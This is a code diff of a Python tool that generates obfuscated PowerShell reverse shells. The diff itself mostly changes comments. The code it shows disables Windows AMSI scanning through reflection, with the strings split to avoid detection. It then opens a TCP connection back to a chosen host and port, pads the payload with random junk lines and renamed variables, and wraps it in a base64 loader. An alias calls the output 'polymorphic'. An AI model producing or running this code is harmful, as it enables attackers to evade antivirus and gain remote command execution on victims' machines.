@@ -12,7 +12,6 @@ def split_string(s):
     return '+'.join([f"'{c}'" for c in s])
 
 def junk_code():
-    # Junk only, never used as shell variable!
     j = [
         f"${rand_name()} = {random.randint(1,100)}",
         f"# {rand_name()}_{random.randint(1000,9999)}",
@@ -23,7 +22,6 @@ def junk_code():
     return random.choice(j) + "\n"
 
 def amsi_bypass_reflection(var):
-    # Reflection-based, classic, safest for VMs
     return (
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
         f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
@@ -33,14 +31,14 @@ def amsi_bypass_reflection(var):
     )
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
-    # Only use these variable names throughout the shell!
+    # Assign *all* needed variables here
     var = {k: rand_name() for k in [
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte"
     ]}
     amsi_bypass = amsi_bypass_reflection(var)
 
-    # Here: ONLY var[] keys used in all logic
+    # Fully explicit core shell: EVERY variable comes from var
     core_shell = (
         junk_code() +
         f"${var['tcpclient']} = New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})\n" +
@@ -58,7 +56,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         junk_code()
     )
 
-    # Always base64 encode for loader
+    # Loader: base64 always, never obfuscate the loader variable!
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
     loader_var = rand_name()
@@ -82,5 +80,4 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     else:
         return ps
 
-# Alias for compatibility
 generate_polymorphic_ps = generate_obfuscated_ps
